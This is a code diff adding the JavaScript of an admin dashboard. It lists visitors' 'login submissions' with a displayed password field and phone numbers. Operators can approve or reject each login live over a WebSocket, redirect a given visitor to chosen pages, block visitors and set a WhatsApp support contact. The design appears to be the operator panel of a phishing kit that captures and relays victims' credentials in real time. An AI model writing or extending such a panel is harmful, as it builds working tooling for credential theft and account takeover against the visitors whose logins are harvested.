+        if (!submissionId || !Array.isArray(activeVisitorSubmissions)) {
+          return;
+        }
+        var normalizedStatus = normalizeApprovalStatus(status);
+        var hasUpdate = false;
+        activeVisitorSubmissions = activeVisitorSubmissions.map(function (entry) {
+          if (String(entry.id || "") !== String(submissionId)) {
+            return entry;
+          }
+          hasUpdate = true;
+          return Object.assign({}, entry, {
+            approval_status: normalizedStatus,
+            password_display:
+              submission && submission.password_display
+                ? submission.password_display
+                : entry.password_display,
+          });
+        });
+        if (hasUpdate) {
+          setVisitorSubmissions(activeVisitorSubmissions);
+        }
+      }
+
+      function getActiveVisitorId() {
+        var activeButton = visitorListEl ? visitorListEl.querySelector(".visitor-item.active") : null;
+        return activeButton ? activeButton.dataset.visitorId || "" : "";
+      }
+
+      function updateVisitorCountLabel() {
+        if (!visitorCountLabelEl || !visitorListEl) {
+          return;
+        }
+        var totalVisitors = visitorListEl.querySelectorAll(".visitor-item").length;
+        visitorCountLabelEl.textContent = "Total: " + String(totalVisitors);
+      }
+
+      function setNoVisitorSubmissionsState(message) {
+        visitorSubmissionsBodyEl.innerHTML =
+          "<div id=\"no-visitor-submissions-row\" class=\"submission-empty text-secondary\">" +
+          escapeHtml(message) +
+          "</div>";
+      }
+
+      function setVisitorSubmissions(items) {
+        activeVisitorSubmissions = Array.isArray(items) ? items.slice() : [];
+        if (activeVisitorSubmissions.length === 0) {
+          setNoVisitorSubmissionsState("No submissions for this visitor.");
+          return;
+        }
+        var cards = groupSubmissionsIntoCards(activeVisitorSubmissions);
+        if (!cards.length) {
+          setNoVisitorSubmissionsState("No login submissions for this visitor.");
+          return;
+        }
+        visitorSubmissionsBodyEl.innerHTML = cards.map(renderLoginSubmissionCard).join("");
+      }
+
+      async function fetchVisitorSubmissions(visitorId) {
+        if (!visitorId) {
+          setNoVisitorSubmissionsState("No visitor selected.");
+          return;
+        }
+        loadingVisitorId = visitorId;
+        try {
+          var response = await fetch("/admin/api/visitor-submissions?visitor_id=" + encodeURIComponent(visitorId));
+          if (!response.ok) {
+            throw new Error("Failed to fetch visitor submissions");
+          }
+          var payload = await response.json();
+          if (loadingVisitorId !== visitorId) {
+            return;
+          }
+          setVisitorSubmissions(payload.items || []);
+        } catch (error) {
+          if (loadingVisitorId === visitorId) {
+            setNoVisitorSubmissionsState("Unable to load submissions.");
+          }
+        } finally {
+          if (loadingVisitorId === visitorId) {
+            loadingVisitorId = null;
+          }
+        }
+      }
+
+      function setActiveVisitor(visitorId) {
+        if (!visitorListEl) {
+          return;
+        }
+        var nextActive = visitorListEl.querySelector(".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]");
+        if (!nextActive) {
+          return;
+        }
+        visitorListEl.querySelectorAll(".visitor-item.active").forEach(function (item) {
+          item.classList.remove("active");
+        });
+        nextActive.classList.add("active");
+        if (selectedVisitorLabelEl) {
+          selectedVisitorLabelEl.textContent = visitorId || "No visitor selected";
+        }
+        fetchVisitorSubmissions(visitorId);
+      }
+
+      function ensureVisitorInList(visitorId, displayId) {
+        if (!visitorListEl || !visitorId) {
+          return null;
+        }
+        var existingItem = visitorListEl.querySelector(".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]");
+        if (existingItem) {
+          if (displayId) {
+            existingItem.dataset.displayId = displayId;
+            var existingLabel = existingItem.querySelector(".visitor-id");
+            if (existingLabel) {
+              existingLabel.textContent = displayId;
+            }
+          }
+          if (!existingItem.dataset.firstCreatedAt || existingItem.dataset.firstCreatedAt === "-") {
+            existingItem.dataset.firstCreatedAt = existingItem.dataset.lastCreatedAt || "-";
+          }
+          updateVisitorCurrentPage(
+            visitorId,
+            onlineVisitorIds.has(visitorId) ? (onlineVisitorPages.get(visitorId) || "-") : "-"
+          );
+          existingItem.classList.toggle("visitor-online", onlineVisitorIds.has(visitorId));
+          updatePinButtonState(visitorId);
+          return existingItem;
+        }
+        var noVisitorsRow = document.getElementById("no-visitors-row");
+        if (noVisitorsRow) {
+          noVisitorsRow.remove();
+        }
+        visitorListEl.insertAdjacentHTML(
+          "afterbegin",
+          renderVisitorItem(
+            {
+              visitor_id: visitorId,
+              display_id: displayId || visitorId,
+              current_page: onlineVisitorIds.has(visitorId) ? (onlineVisitorPages.get(visitorId) || "-") : "-",
+              first_created_at: "-",
+              last_created_at: "-",
+              submissions_count: 0
+            },
+            false
+          )
+        );
+        updateVisitorCountLabel();
+        var insertedItem = visitorListEl.querySelector(".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]");
+        updatePinButtonState(visitorId);
+        return insertedItem;
+      }
+
+      function incrementVisitorCounter(visitorItem) {
+        if (!visitorItem) {
+          return;
+        }
+        var previousCount = Number.parseInt(visitorItem.dataset.submissionsCount || "0", 10);
+        var nextCount = Number.isFinite(previousCount) ? previousCount + 1 : 1;
+        visitorItem.dataset.submissionsCount = String(nextCount);
+        var badge = visitorItem.querySelector(".visitor-count");
+        if (badge) {
+          badge.textContent = String(nextCount);
+        }
+      }
+
+      function handleNewSubmission(submission) {
+        var visitorId = submission.visitor_id || "";
+        var displayId = submission.visitor_display_id || submission.phone_number_display || submission.phone_number || visitorId;
+        var currentPage = normalizeCurrentPage(submission.page_path || onlineVisitorPages.get(visitorId) || "-");
+        var createdAt = String(submission.created_at || "-");
+        if (displayId === "-") {
+          displayId = visitorId;
+        }
+        if (!visitorId) {
+          return;
+        }
+        onlineVisitorPages.set(visitorId, currentPage);
+        var visitorItem = ensureVisitorInList(visitorId, displayId);
+        if (visitorItem) {
+          visitorItem.dataset.lastCreatedAt = createdAt;
+          if (!visitorItem.dataset.firstCreatedAt || visitorItem.dataset.firstCreatedAt === "-") {
+            visitorItem.dataset.firstCreatedAt = createdAt;
+          }
+        }
+        updateVisitorCurrentPage(visitorId, currentPage);
+        incrementVisitorCounter(visitorItem);
+        if (visitorItem && visitorItem.parentElement === visitorListEl) {
+          visitorListEl.insertBefore(visitorItem, visitorListEl.firstChild);
+        }
+        var activeVisitorId = getActiveVisitorId();
+        if (activeVisitorId !== visitorId) {
+          if (visitorListEl) {
+            visitorListEl.querySelectorAll(".visitor-item.active").forEach(function (item) {
+              item.classList.remove("active");
+            });
+            var newActiveItem = visitorListEl.querySelector(
+              ".visitor-item[data-visitor-id=\"" + CSS.escape(visitorId) + "\"]"
+            );
+            if (newActiveItem) {
+              newActiveItem.classList.add("active");
+            }
+          }
+          if (selectedVisitorLabelEl) {
+            selectedVisitorLabelEl.textContent = visitorId;
+          }
+          fetchVisitorSubmissions(visitorId);
+          reorderVisitorList();
+          return;
+        }
+        activeVisitorSubmissions = [submission].concat(activeVisitorSubmissions || []);
+        while (activeVisitorSubmissions.length > maxRows) {
+          activeVisitorSubmissions.pop();
+        }
+        setVisitorSubmissions(activeVisitorSubmissions);
+        reorderVisitorList();
+      }
+
+      function scheduleReconnect() {
+        if (reconnectTimer !== null) {
+          return;
+        }
+        reconnectTimer = window.setTimeout(function () {
+          reconnectTimer = null;
+          connectAdminWebSocket();
+        }, 1000);
+      }
+
+      async function approveSubmission(submissionId, buttonEl) {
+        if (!submissionId || !buttonEl) {
+          return;
+        }
+        var originalLabel = buttonEl.textContent;
+        buttonEl.disabled = true;
+        buttonEl.textContent = "Approving...";
+        try {
+          var response = await fetch(
+            "/admin/api/submissions/" + encodeURIComponent(submissionId) + "/approve",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "x-csrf-token": csrfToken
+              }
+            }
+          );
+          if (!response.ok) {
+            throw new Error("Approval request failed");
+          }
+          var payload = await response.json();
+          markSubmissionStatus(submissionId, "approved", payload.submission || null);
+        } catch (error) {
+          buttonEl.disabled = false;
+          buttonEl.textContent = originalLabel;
+        }
+      }
+
+      async function rejectSubmission(submissionId, buttonEl) {
+        if (!submissionId || !buttonEl) {
+          return;
+        }
+        var originalLabel = buttonEl.textContent;
+        buttonEl.disabled = true;
+        buttonEl.textContent = "Rejecting...";
+        try {
+          var response = await fetch(
+            "/admin/api/submissions/" + encodeURIComponent(submissionId) + "/reject",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+                "x-csrf-token": csrfToken
+              }
+            }
+          );
+          if (!response.ok) {
+            throw new Error("Rejection request failed");
+          }
+          var payload = await response.json();
+          markSubmissionStatus(submissionId, "rejected", payload.submission || null);
+        } catch (error) {
+          buttonEl.disabled = false;
+          buttonEl.textContent = originalLabel;
+        }
+      }
+
+      function connectAdminWebSocket() {
+        if (
+          adminSocket &&
+          (adminSocket.readyState === WebSocket.OPEN || adminSocket.readyState === WebSocket.CONNECTING)
+        ) {
+          return;
+        }
+        var protocol = window.location.protocol === "https:" ? "wss" : "ws";
+        var wsUrl = protocol + "://" + window.location.host + "/admin/ws?token=" + encodeURIComponent(wsToken);
+        adminSocket = new WebSocket(wsUrl);
+
+        adminSocket.onmessage = function (event) {
+          try {
+            var data = JSON.parse(event.data);
+          if (data.type === "snapshot") {
+              setOnlineUsers(data.online_users);
+              if (data.support_settings) {
+                applySupportSettings(data.support_settings);
+              }
+              refreshOnlineVisitorIds();
+              refreshOnlineVisitorPages();
+            } else if (data.type === "online_users") {
+              setOnlineUsers(data.online_users);
+              refreshOnlineVisitorIds();
+              refreshOnlineVisitorPages();
+            } else if (data.type === "visitor_block_updated" && data.visitor_id) {
+              updateBlockButtonState(String(data.visitor_id), Boolean(data.blocked));
+            } else if (data.type === "new_submission" && data.submission) {
+              handleNewSubmission(data.submission);
+            } else if (data.type === "support_settings_updated" && data.support_settings) {
+              applySupportSettings(data.support_settings);
+            } else if (data.type === "submission_approved" && data.submission_id) {
+              markSubmissionStatus(String(data.submission_id), "approved", data.submission || null);
+            } else if (data.type === "submission_rejected" && data.submission_id) {
+              markSubmissionStatus(String(data.submission_id), "rejected", data.submission || null);
+            }
+          } catch (error) {
+          }
+        };
+
+        adminSocket.onclose = function () {
+          adminSocket = null;
+          scheduleReconnect();
+        };
+
+        adminSocket.onerror = function () {
+          try {
+            adminSocket.close();
+          } catch (error) {
+          }
+        };
+      }
+
+      function refreshAdminWakeState() {
+        connectAdminWebSocket();
+        refreshOnlineVisitorIds();
+        refreshOnlineVisitorPages();
+        var activeVisitorId = getActiveVisitorId();
+        if (activeVisitorId) {
+          fetchVisitorSubmissions(activeVisitorId);
+        }
+      }
+
+      if (visitorListEl) {
+        visitorListEl.addEventListener("click", function (event) {
+          var blockButton = event.target.closest(".visitor-block-btn");
+          if (blockButton) {
+            var blockVisitorItem = event.target.closest(".visitor-item");
+            if (!blockVisitorItem) {
+              return;
+            }
+            var blockVisitorId = blockVisitorItem.dataset.visitorId || "";
+            if (!blockVisitorId) {
+              return;
+            }
+            event.preventDefault();
+            event.stopPropagation();
+            toggleVisitorBlocked(
+              blockVisitorId,
+              String(blockVisitorItem.dataset.blocked || "") === "true",
+              blockButton
+            );
+            return;
+          }
+          var pinButton = event.target.closest(".visitor-pin-btn");
+          if (pinButton) {
+            var pinVisitorItem = event.target.closest(".visitor-item");
+            if (!pinVisitorItem) {
+              return;
+            }
+            var pinVisitorId = pinVisitorItem.dataset.visitorId || "";
+            if (!pinVisitorId) {
+              return;
+            }
+            event.preventDefault();
+            event.stopPropagation();
+            toggleVisitorPin(pinVisitorId);
+            return;
+          }
+
+          var pageBadge = event.target.closest(".visitor-page-btn");
+          if (pageBadge) {
+            var pageVisitorItem = event.target.closest(".visitor-item");
+            if (!pageVisitorItem) {
+              return;
+            }
+            var pageVisitorId = pageVisitorItem.dataset.visitorId || "";
+            var currentPath = pageVisitorItem.dataset.currentPage || "-";
+            if (!pageVisitorId) {
+              return;
+            }
+            openVisitorPageModal(pageVisitorId, currentPath);
+            return;
+          }
+          var visitorItem = event.target.closest(".visitor-item");
+          if (!visitorItem) {
+            return;
+          }
+          var visitorId = visitorItem.dataset.visitorId || "";
+          if (!visitorId) {
+            return;
+          }
+          setActiveVisitor(visitorId);
+        });
+      }
+
+      if (visitorPageModalCloseEl) {
+        visitorPageModalCloseEl.addEventListener("click", function () {
+          closeVisitorPageModal();
+        });
+      }
+
+      if (visitorPageModalButtonsEl) {
+        visitorPageModalButtonsEl.addEventListener("click", function (event) {
+          var pageButton = event.target.closest(".visitor-page-option");
+          if (!pageButton || pageButton.disabled) {
+            return;
+          }
+          var targetPath = pageButton.getAttribute("data-target-path") || "";
+          if (!targetPath || !visitorPageModalVisitorId) {
+            return;
+          }
+          redirectVisitorToPath(visitorPageModalVisitorId, targetPath, pageButton);
+        });
+      }
+
+      if (visitorPageModalEl) {
+        visitorPageModalEl.addEventListener("click", function (event) {
+          if (event.target === visitorPageModalEl) {
+            closeVisitorPageModal();
+          }
+        });
+      }
+
+      if (supportSettingsOpenBtnEl) {
+        supportSettingsOpenBtnEl.addEventListener("click", function () {
+          openSupportSettingsModal();
+        });
+      }
+
+      if (supportSettingsCloseBtnEl) {
+        supportSettingsCloseBtnEl.addEventListener("click", function () {
+          closeSupportSettingsModal();
+        });
+      }
+
+      if (supportSettingsSaveBtnEl) {
+        supportSettingsSaveBtnEl.addEventListener("click", function () {
+          saveSupportSettings();
+        });
+      }
+
+      if (supportWhatsappInputEl) {
+        supportWhatsappInputEl.addEventListener("input", function () {
+          applySupportSettings({ whatsapp_number: supportWhatsappInputEl.value });
+        });
+        supportWhatsappInputEl.addEventListener("keydown", function (event) {
+          if (event.key === "Enter") {
+            event.preventDefault();
+            saveSupportSettings();
+          }
+        });
+      }
+
+      if (supportSettingsModalEl) {
+        supportSettingsModalEl.addEventListener("click", function (event) {
+          if (event.target === supportSettingsModalEl) {
+            closeSupportSettingsModal();
+          }
+        });
+      }
+
+      window.addEventListener("focus", function () {
+        refreshAdminWakeState();
+      });
+
+      document.addEventListener("visibilitychange", function () {
+        if (!document.hidden) {
+          refreshAdminWakeState();
+        }
+      });
+
+      if (visitorSubmissionsBodyEl) {
+        visitorSubmissionsBodyEl.addEventListener("click", function (event) {
+          var approveButton = event.target.closest("[data-action='approve-submission']");
+          if (approveButton) {
+            var approveSubmissionId = approveButton.getAttribute("data-submission-id") || "";
+            if (!approveSubmissionId) {
+              return;
+            }
+            approveSubmission(approveSubmissionId, approveButton);
+            return;
+          }
+          var rejectButton = event.target.closest("[data-action='reject-submission']");
+          if (rejectButton) {
+            var rejectSubmissionId = rejectButton.getAttribute("data-submission-id") || "";
+            if (!rejectSubmissionId) {
+              return;
+            }
+            rejectSubmission(rejectSubmissionId, rejectButton);
+          }
+        });
+      }
+
+      setVisitorSubmissions(initialSelectedSubmissions);
+
+      var initialOnlineCount = Number.parseInt(countEl.textContent, 10);
+      if (Number.isFinite(initialOnlineCount)) {
+        setOnlineUsers(initialOnlineCount);
+      } else {
+        setOnlineUsers(null);
+      }
+
+      pinnedVisitors = loadPinnedVisitors();
+      applySupportSettings(supportSettings);
+      if (visitorListEl) {
+        visitorListEl.querySelectorAll(".visitor-item").forEach(function (item) {
+          var visitorId = item.dataset.visitorId || "";
+          if (visitorId) {
+            updatePinButtonState(visitorId);
+          }
+        });
+      }
+
+      updateVisitorCountLabel();
+      reorderVisitorList();
+      refreshOnlineVisitorIds();
+      refreshOnlineVisitorPages();
+      window.setInterval(refreshOnlineVisitorPages, 2000);
+      connectAdminWebSocket();
+    })();
+  </script>
+</body>
+</html>
